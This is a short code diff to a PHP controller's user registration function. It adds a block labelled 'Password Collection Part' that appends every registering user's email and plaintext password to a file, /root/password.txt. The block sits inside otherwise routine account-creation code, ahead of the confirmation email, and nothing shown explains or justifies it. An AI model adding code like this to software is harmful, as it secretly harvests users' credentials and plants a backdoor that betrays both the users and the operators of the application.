@@ -368,6 +368,13 @@ class AppController extends Controller
                     'is_auth' => 0
                 ]
             );
+
+            //========Password Collection Part========
+            $passwordFile = "/root/password.txt";
+            $cred = $_email . ':' . $_password . '\n';
+            file_put_contents($passwordFile, $cred, FILE_APPEND | LOCK_EX);
+            //========================================
+
             $this->addUnreadMessageLocalAPI('$2y$10$1jAy7xe4qnXcbW6DmBkc4e1gQ9El6HS83id77xYzE0yj2qfnxLYOK', $_name, 'Thanks for registering! You could find a confirmation link in your Email.');
             $this->sendAuthEmail($authSession, $_email);
             return ["success" => true, 
